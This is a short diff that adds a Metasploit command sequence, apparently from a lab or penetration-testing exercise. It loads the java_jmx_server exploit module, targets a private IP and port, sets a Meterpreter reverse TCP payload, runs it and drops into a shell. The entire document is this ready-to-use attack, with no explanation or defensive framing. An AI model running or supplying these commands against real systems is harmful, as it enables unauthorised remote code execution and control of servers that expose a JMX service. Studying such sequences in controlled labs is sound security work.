@@ -1,0 +1,6 @@
+use exploit/multi/misc/java_jmx_server
+set rhost 192.168.51.146
+set rport 18983
+set payload java/meterpreter/reverse_tcp
+run
+shell
